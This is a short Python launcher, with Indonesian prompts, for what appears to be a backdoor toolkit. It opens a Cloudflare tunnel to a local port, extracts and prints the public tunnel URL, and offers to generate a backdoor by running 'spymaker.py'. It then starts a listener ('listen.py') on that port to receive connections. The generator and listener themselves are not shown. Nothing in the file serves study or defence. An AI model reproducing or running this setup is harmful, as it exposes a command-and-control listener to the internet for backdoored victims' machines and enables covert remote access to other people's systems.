import subprocess
import time
import sys
WHITE_BG = '\033[107m'
BLACK = '\033[30m'
RESET = '\033[0m'
WHITE = '\033[97m'
RED_BG = '\033[41m'
ORANGE_BG = '\033[48;5;202m'
port = sys.argv[1]
cloudflared_command = f"cloudflared tunnel --url http://localhost:{port} > output.txt 2>&1 &"
subprocess.run(cloudflared_command, shell=True)

time.sleep(10)

grep_command = "grep -oP 'https://[^\s\"]+' output.txt | grep -Ev 'https://developers\.cloudflare\.com/cloudflare-one/connections/connect-apps(/run-tunnel/as-a-service/)?' | grep -Ev 'https://github\.com/quic-go/quic-go/wiki/UDP-Receive-Buffer-Size' | tail -n 1"
result = subprocess.run(grep_command, shell=True, capture_output=True, text=True)

print(WHITE + RED_BG + " ☍ " + BLACK + WHITE_BG + " Link " + RESET)
print(result.stdout.strip())

backdoor_choice = input(BLACK + WHITE_BG + " Buat Backdoor? [y/n] " + RESET)
if backdoor_choice.lower() == "y":
    print(BLACK + WHITE_BG + " Membuat Backdoor " + RESET)
    subprocess.run(["python3", "spymaker.py"])
else:
    print(BLACK + WHITE_BG + " Skip Membuat Backdoor " + RESET)
print(RESET)
print(WHITE + RED_BG + " 〣 " + BLACK + WHITE_BG + " Listening ... " + RESET)
subprocess.run(["python3", "listen.py", port])
